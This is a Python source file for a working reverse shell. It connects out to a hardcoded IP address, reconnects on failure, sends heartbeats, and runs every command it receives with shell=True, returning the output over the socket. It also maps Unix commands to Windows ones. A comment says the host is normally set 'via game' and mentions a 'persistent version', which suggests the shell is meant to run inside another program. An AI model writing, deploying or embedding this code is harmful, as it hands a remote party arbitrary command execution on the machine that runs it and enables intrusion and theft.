import socket
import subprocess
import threading
import os
import sys
import time

class ReverseShell:
    def __init__(self, host="127.0.0.1", port=5050):
        self.host = host
        self.port = port
        self.connected = False
        self.status = "IDLE"
        self.sock = None
        self.thread = None
        self._stop_event = threading.Event()
        
        # Command Mapping for cross-platform feel
        self.MAPPED_COMMANDS = {
            "ls": "dir",
            "pwd": "echo %cd%",
            "clear": "cls",
            "ifconfig": "ipconfig",
            "cat": "type",
            "grep": "findstr"
        }

    def _connect_and_shell(self):
        self.status = f"CONNECTING TO {self.host}..."
        while not self._stop_event.is_set():
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.settimeout(5.0)
                self.sock.connect((self.host, self.port))
                self.sock.settimeout(None)
                self.connected = True
                self.status = f"CONNECTED TO {self.host}"
                
                # Send heartbeat in background
                heartbeat_thread = threading.Thread(target=self._heartbeat, daemon=True)
                heartbeat_thread.start()

                # Send initial greeting with current path
                initial_msg = f"[SYSTEM] Secure Shell Active. Current Path: {os.getcwd()}\n"
                self.sock.send(initial_msg.encode("utf-8"))
                
                while self.connected and not self._stop_event.is_set():
                    raw_data = self.sock.recv(4096)
                    if not raw_data: 
                        break
                    data = raw_data.decode("utf-8", errors="replace").strip()
                    
                    if data.lower() == "ping":
                        self.sock.send(b"pong\n")
                        continue
                    if data.lower() == "quit":
                        break
                    
                    # Handle Aliases
                    parts = data.split()
                    cmd_base = parts[0].lower() if parts else ""
                    if cmd_base in self.MAPPED_COMMANDS:
                        data = self.MAPPED_COMMANDS[cmd_base] + " " + " ".join(parts[1:])
                        data = data.strip()

                    # Handle stateful CD
                    if data.lower().startswith("cd "):
                        path = data[3:].strip()
                        try:
                            # Handle relative and absolute paths
                            os.chdir(os.path.expanduser(path))
                            response = f"[DIRECTORY CHANGED] -> {os.getcwd()}\n"
                            self.sock.send(response.encode("utf-8"))
                        except Exception as e:
                            self.sock.send(f"CD Error: {str(e)}\n".encode("utf-8"))
                        continue

                    # Execute command
                    try:
                        # Use shell=True for full command support
                        proc = subprocess.Popen(data, shell=True, 
                                             stdout=subprocess.PIPE, 
                                             stderr=subprocess.PIPE, 
                                             stdin=subprocess.PIPE,
                                             cwd=os.getcwd())
                        stdout, stderr = proc.communicate()
                        output = stdout + stderr
                        
                        # Add trailing newline and directory info for 'majestic' feel
                        if not output: 
                            output = b"[Done]\n"
                        
                        # Append the current directory to every output for context
                        context_tag = f"\n[PATH: {os.getcwd()}]\n"
                        self.sock.send(output + context_tag.encode("utf-8"))
                        
                    except Exception as e:
                        self.sock.send(f"Exec Error: {str(e)}\n".encode("utf-8"))
            
            except Exception as e:
                self.status = f"RETRYING: {str(e)[:20]}..."
                time.sleep(2) # Wait before retry
            finally:
                self.connected = False
                if self.sock: self.sock.close()
                if self._stop_event.is_set(): break

    def _heartbeat(self):
        while self.connected:
            try:
                # Named heartbeat to prevent sync issues and "Broken Pipe"
                self.sock.send(b"[HEARTBEAT]\n") 
                time.sleep(15)
            except:
                self.connected = False
                break

    def start(self):
        if not self.thread or not self.thread.is_alive():
            self._stop_event.clear()
            self.thread = threading.Thread(target=self._connect_and_shell, daemon=True)
            self.thread.start()

    def stop(self):
        self._stop_event.set()
        self.connected = False
        if self.sock: self.sock.close()

if __name__ == "__main__":
    # Default host usually set via game, but here we can hardcode for the persistent version
    # Or read from a config file. Let's use the user's preferred IP.
    shell = ReverseShell(host="10.12.72.224")
    shell._connect_and_shell() # Run in foreground for the standalone process
